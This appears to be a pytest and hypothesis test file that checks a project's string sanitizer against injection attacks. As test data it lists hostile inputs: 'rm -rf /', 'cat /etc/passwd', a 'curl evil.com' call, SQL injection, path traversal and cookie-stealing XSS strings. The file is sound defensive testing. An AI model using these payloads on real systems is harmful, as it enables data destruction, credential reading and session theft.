import pytest
pytest.importorskip("hypothesis")
"""
Property-Based Tests for Input Validation
==========================================
Tests universal properties of input validation system.

Property 12: Input Validation Rejects Invalid Inputs
"""

import pytest
from hypothesis import given, strategies as st, assume, settings, HealthCheck
from pydantic import ValidationError as PydanticValidationError

from mahoun.core.validation import (
    StringSanitizer,
    SafeString,
    SafeQuery,
    SafeFilename,
    SafeDocumentId,
    ValidatedSearchRequest,
    ValidatedDocumentRequest,
    ValidatedFileUpload,
    validate_and_sanitize_dict,
    validate_list_of_strings,
)
from mahoun.core.exceptions import ValidationError


# =============================================================================
# Hypothesis Strategies
# =============================================================================

@st.composite
def safe_string_strategy(draw):
    """Generate safe strings (no injection patterns)."""
    # Use limited character set to avoid injection patterns
    return draw(st.text(
        min_size=1,
        max_size=100,
        alphabet=st.characters(
            whitelist_categories=('Lu', 'Ll', 'Nd', 'Zs'),
            whitelist_characters='.-_'
        )
    ))


@st.composite
def sql_injection_strategy(draw):
    """Generate strings with SQL injection patterns."""
    patterns = [
        "'; DROP TABLE users--",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM passwords--",
        "1; DELETE FROM logs WHERE 1=1--",
    ]
    return draw(st.sampled_from(patterns))


@st.composite
def command_injection_strategy(draw):
    """Generate strings with command injection patterns."""
    patterns = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "${USER}",
        "&& curl evil.com",
    ]
    return draw(st.sampled_from(patterns))


@st.composite
def path_traversal_strategy(draw):
    """Generate strings with path traversal patterns."""
    patterns = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "~/secret",
        "../../config",
    ]
    return draw(st.sampled_from(patterns))


@st.composite
def xss_injection_strategy(draw):
    """Generate strings with XSS patterns."""
    patterns = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "javascript:alert(document.cookie)",
    ]
    return draw(st.sampled_from(patterns))


# =============================================================================
# Property 12: Input Validation Rejects Invalid Inputs
# =============================================================================

@settings(suppress_health_check=[HealthCheck.too_slow])
@given(injection=sql_injection_strategy())
def test_property_sql_injection_rejected(injection: str) -> None:
    """
    Property: SQL injection patterns SHALL be detected and rejected.
    
    Validates: Requirement 10.4 (Sanitize string inputs)
    """
    # SQL injection should be detected
    assert StringSanitizer.check_sql_injection(injection), \
        f"SQL injection not detected: {injection}"
    
    # Sanitizer should raise ValidationError
    with pytest.raises(ValidationError, match="SQL injection"):
        StringSanitizer.sanitize(injection, check_injections=True)


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(injection=command_injection_strategy())
def test_property_command_injection_rejected(injection: str) -> None:
    """
    Property: Command injection patterns SHALL be detected and rejected.
    
    Validates: Requirement 10.4 (Sanitize string inputs)
    """
    # Command injection should be detected
    assert StringSanitizer.check_command_injection(injection), \
        f"Command injection not detected: {injection}"
    
    # Sanitizer should raise ValidationError
    with pytest.raises(ValidationError, match="command injection"):
        StringSanitizer.sanitize(injection, check_injections=True)


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(injection=path_traversal_strategy())
def test_property_path_traversal_rejected(injection: str) -> None:
    """
    Property: Path traversal patterns SHALL be detected and rejected.
    
    Validates: Requirement 10.4 (Sanitize string inputs)
    """
    # Path traversal should be detected
    assert StringSanitizer.check_path_traversal(injection), \
        f"Path traversal not detected: {injection}"
    
    # Sanitizer should raise ValidationError
    with pytest.raises(ValidationError, match="path traversal"):
        StringSanitizer.sanitize(injection, check_injections=True)


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(xss=xss_injection_strategy())
def test_property_xss_escaped(xss: str) -> None:
    """
    Property: XSS patterns SHALL be escaped in HTML context.
    
    Validates: Requirement 10.4 (Sanitize string inputs)
    """
    # Escape HTML
    escaped = StringSanitizer.sanitize_html(xss)
    
    # Should not contain raw < or >
    assert '<' not in escaped or '&lt;' in escaped
    assert '>' not in escaped or '&gt;' in escaped
    
    # Should contain HTML entities
    assert '&' in escaped


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(text=safe_string_strategy())
def test_property_safe_strings_accepted(text: str) -> None:
    """
    Property: Safe strings SHALL be accepted without modification.
    
    Validates: Requirement 10.1 (Validate all inputs)
    """
    assume(len(text) > 0 and len(text) <= 100)
    
    # Safe strings should pass validation
    sanitized = StringSanitizer.sanitize(text, max_length=100)
    
    # Should not raise exception
    assert isinstance(sanitized, str)
    assert len(sanitized) <= 100


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(text=st.text(min_size=1, max_size=50))
def test_property_null_bytes_removed(text: str) -> None:
    """
    Property: Null bytes SHALL be removed from all strings.
    
    Validates: Requirement 10.4 (Sanitize string inputs)
    """
    # Add null byte
    text_with_null = text + '\x00' + text
    
    # Sanitize
    sanitized = StringSanitizer.remove_null_bytes(text_with_null)
    
    # Should not contain null bytes
    assert '\x00' not in sanitized


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(
    text=st.text(min_size=1, max_size=50),
    max_length=st.integers(min_value=1, max_value=100)
)
def test_property_length_limits_enforced(text: str, max_length: int) -> None:
    """
    Property: Length limits SHALL be enforced on all strings.
    
    Validates: Requirement 10.3 (Reject invalid inputs)
    """
    if len(text) > max_length:
        # Should raise ValidationError
        with pytest.raises(ValidationError, match="too long"):
            StringSanitizer.sanitize(text, max_length=max_length)
    else:
        # Should pass
        sanitized = StringSanitizer.sanitize(text, max_length=max_length)
        assert len(sanitized) <= max_length


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(
    query=st.text(min_size=1, max_size=100, alphabet=st.characters(
        whitelist_categories=('Lu', 'Ll', 'Nd', 'Zs')
    )),
    limit=st.integers(min_value=1, max_value=100),
    offset=st.integers(min_value=0, max_value=1000)
)
def test_property_search_request_validation(query: str, limit: int, offset: int) -> None:
    """
    Property: ValidatedSearchRequest SHALL accept valid inputs.
    
    Validates: Requirement 10.2 (Use Pydantic for validation)
    """
    # Create request
    request = ValidatedSearchRequest(
        query=query,
        limit=limit,
        offset=offset
    )
    
    # Should be valid
    assert request.query == query
    assert request.limit == limit
    assert request.offset == offset
    assert 1 <= request.limit <= 100
    assert 0 <= request.offset <= 10000


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(limit=st.integers())
def test_property_search_request_rejects_invalid_limit(limit: int) -> None:
    """
    Property: ValidatedSearchRequest SHALL reject invalid limits.
    
    Validates: Requirement 10.3 (Reject invalid inputs)
    """
    assume(limit < 1 or limit > 100)
    
    # Should raise ValidationError
    with pytest.raises(PydanticValidationError):
        ValidatedSearchRequest(
            query="test",
            limit=limit,
            offset=0
        )


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(filename=st.text(min_size=1, max_size=50))
def test_property_filename_validation(filename: str) -> None:
    """
    Property: SafeFilename SHALL reject dangerous filenames.
    
    Validates: Requirement 10.4 (Sanitize string inputs)
    """
    # Check if filename is safe
    has_path_traversal = StringSanitizer.check_path_traversal(filename)
    has_forbidden_chars = bool(re.search(r'[<>:"|?*\x00-\x1f]', filename))
    starts_with_dot = filename.startswith('.')
    
    if has_path_traversal or has_forbidden_chars or starts_with_dot:
        # Should raise ValidationError
        with pytest.raises((ValidationError, PydanticValidationError)):
            SafeFilename(value=filename)
    else:
        # Should pass
        safe = SafeFilename(value=filename)
        assert safe.value == filename


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(
    doc_id=st.text(
        min_size=1,
        max_size=50,
        alphabet=st.characters(whitelist_categories=('Lu', 'Ll', 'Nd'), whitelist_characters='-_')
    )
)
def test_property_document_id_validation(doc_id: str) -> None:
    """
    Property: SafeDocumentId SHALL accept alphanumeric IDs only.
    
    Validates: Requirement 10.2 (Use Pydantic for validation)
    """
    # Should pass validation
    safe_id = SafeDocumentId(value=doc_id)
    assert safe_id.value == doc_id
    
    # Should only contain allowed characters
    import re
    assert re.match(r'^[a-zA-Z0-9_-]+$', safe_id.value)


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(
    items=st.lists(
        st.text(min_size=1, max_size=50, alphabet=st.characters(
            whitelist_categories=('Lu', 'Ll', 'Nd', 'Zs')
        )),
        min_size=1,
        max_size=10
    )
)
def test_property_list_validation(items: list[str]) -> None:
    """
    Property: validate_list_of_strings SHALL sanitize all items.
    
    Validates: Requirement 10.1 (Validate all inputs)
    """
    # Validate list
    sanitized = validate_list_of_strings(items, max_items=100, max_length=1000)
    
    # Should have same length
    assert len(sanitized) == len(items)
    
    # All items should be strings
    assert all(isinstance(item, str) for item in sanitized)


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(items=st.lists(st.text(), min_size=101, max_size=200))
def test_property_list_size_limit_enforced(items: list[str]) -> None:
    """
    Property: List size limits SHALL be enforced.
    
    Validates: Requirement 10.3 (Reject invalid inputs)
    """
    # Should raise ValidationError
    with pytest.raises(ValidationError, match="Too many items"):
        validate_list_of_strings(items, max_items=100)


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(
    data=st.dictionaries(
        keys=st.text(min_size=1, max_size=20, alphabet=st.characters(
            whitelist_categories=('Lu', 'Ll', 'Nd')
        )),
        values=st.one_of(
            st.text(min_size=1, max_size=50),
            st.integers(),
            st.booleans(),
            st.none()
        ),
        min_size=1,
        max_size=10
    )
)
def test_property_dict_validation(data: dict) -> None:
    """
    Property: validate_and_sanitize_dict SHALL sanitize all values.
    
    Validates: Requirement 10.1 (Validate all inputs)
    """
    # Validate dict
    sanitized = validate_and_sanitize_dict(data, max_depth=5)
    
    # Should have same keys
    assert set(sanitized.keys()) == set(data.keys())
    
    # All keys should be strings
    assert all(isinstance(key, str) for key in sanitized.keys())


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(
    content_type=st.sampled_from([
        'application/pdf',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'text/plain',
        'text/markdown',
        'application/json',
    ]),
    size=st.integers(min_value=1, max_value=100_000_000)
)
def test_property_file_upload_validation(content_type: str, size: int) -> None:
    """
    Property: ValidatedFileUpload SHALL accept valid file types.
    
    Validates: Requirement 10.2 (Use Pydantic for validation)
    """
    # Create upload request
    upload = ValidatedFileUpload(
        filename="test.pdf",
        content_type=content_type,
        size_bytes=size
    )
    
    # Should be valid
    assert upload.content_type == content_type
    assert upload.size_bytes == size
    assert 1 <= upload.size_bytes <= 100_000_000


@settings(suppress_health_check=[HealthCheck.too_slow])
@given(content_type=st.text(min_size=1, max_size=50))
def test_property_file_upload_rejects_invalid_types(content_type: str) -> None:
    """
    Property: ValidatedFileUpload SHALL reject unsupported file types.
    
    Validates: Requirement 10.3 (Reject invalid inputs)
    """
    allowed_types = {
        'application/pdf',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'text/plain',
        'text/markdown',
        'application/json',
    }
    
    assume(content_type not in allowed_types)
    
    # Should raise ValidationError
    with pytest.raises((ValidationError, PydanticValidationError)):
        ValidatedFileUpload(
            filename="test.txt",
            content_type=content_type,
            size_bytes=1000
        )


# =============================================================================
# Additional Unit Tests
# =============================================================================

def test_sanitizer_removes_null_bytes():
    """Test that null bytes are removed."""
    text = "hello\x00world"
    sanitized = StringSanitizer.remove_null_bytes(text)
    assert sanitized == "helloworld"
    assert '\x00' not in sanitized


def test_sanitizer_escapes_html():
    """Test that HTML is escaped."""
    text = "<script>alert('XSS')</script>"
    escaped = StringSanitizer.sanitize_html(text)
    assert '<script>' not in escaped
    assert '&lt;script&gt;' in escaped


def test_safe_string_rejects_too_long():
    """Test that SafeString rejects strings that are too long."""
    with pytest.raises((ValidationError, PydanticValidationError)):
        SafeString(value="a" * 10001)


def test_validated_search_request_defaults():
    """Test ValidatedSearchRequest default values."""
    request = ValidatedSearchRequest(query="test")
    assert request.limit == 10
    assert request.offset == 0


def test_validated_document_request_metadata_limit():
    """Test that metadata field count is limited."""
    metadata = {f"key_{i}": f"value_{i}" for i in range(51)}
    
    with pytest.raises((ValidationError, PydanticValidationError)):
        ValidatedDocumentRequest(
            title="Test",
            content="Content",
            doc_type="test",
            metadata=metadata
        )


# Import re for regex tests
import re
